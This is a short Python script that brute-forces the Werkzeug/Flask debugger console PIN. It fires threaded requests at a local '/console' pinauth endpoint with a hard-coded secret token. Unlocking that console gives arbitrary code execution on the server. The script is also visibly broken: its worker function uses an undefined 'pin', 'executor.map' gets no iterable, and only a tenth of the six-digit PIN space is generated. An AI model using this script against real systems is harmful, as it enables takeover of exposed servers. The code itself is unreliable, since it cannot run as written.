import requests
from concurrent.futures import ThreadPoolExecutor

found = False
pins = []

for password in range(0,10000):
    pass_str = str(password)
    filled_password = pass_str.zfill(6) 
    pins.append(filled_password)
    
print('start bruteforce:')

def brute_force():
    global found
    if found: 
        return None

    try:
        response = requests.get(f"http://127.0.0.1:5000/console?__debugger__=yes&cmd=pinauth&pin={pin}&s=nE4rxsZbRISEbNA0PleH"
)
        print('reponse:',response)
       
    except:
        pass
    return None
    

with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(brute_force)


